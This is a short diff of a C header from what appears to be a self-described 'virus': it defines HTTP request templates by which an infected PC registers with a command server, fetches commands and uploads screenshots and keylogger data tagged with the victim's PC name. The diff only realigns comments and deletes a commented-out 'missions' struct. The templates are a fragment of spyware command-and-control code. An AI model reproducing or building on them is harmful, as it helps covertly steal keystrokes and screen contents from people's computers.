@@ -43,14 +43,14 @@ extern int SOCKET_PORT;
 #define END_OF_HEADERS "\r\n\r\n"
 #define FIRST_CONNECTION_MSG "POST /first_connection HTTP/1.1\r\nAccept: application/json\r\nContent-Type: application/json"
 #define GET_COMMAND_MSG "GET /command/%s HTTP/1.1\r\nAccept: application/json\r\nHost: %s\r\n\r\n"
-//						     pc_name^^^^^                                    domain_name^  
+//			    pc_name^^^^^                                    domain_name^  
 
 #define POST_PICTURE_MSG "POST /%s/picture HTTP/1.1\r\nAccept: application/json\r\nContent-Type: application/json\r\nContent-Length: %d\r\nHost: %s\r\n\r\n{%cpicture_content%c:%c"/*%s%c}  ->  added in the function*/
-//						pc_name^											                	                          data_length^ domain_name^                   ^picture_data
+//						pc_name^	 	                	                           data_length^ domain_name^                                 ^picture_data
 
 
 #define POST_Key_Logger_MSG "POST /%s/key_logger HTTP/1.1\r\nAccept: application/json\r\nContent-Type: application/json\r\nContent-Length: %d\r\nHost: %s\r\n\r\n{%ckey_logger%c:%c%s%c}"
-//						    pc_name^						  				                									 data_length^ domain_name^                ^key_logger_data
+//						    pc_name^									 data_length^ domain_name^                          ^key_logger_data
 
 
 
@@ -93,12 +93,6 @@ struct SPECIAL_KEY
 	char key_name[9];
 };
 
-
-// used for the socket -> the missions / tasks for the virus
-/*struct MISSIONS
-{
-	char command[SIZE_OF_COMMAND];
-};*/
 
 struct BASE_64
 {
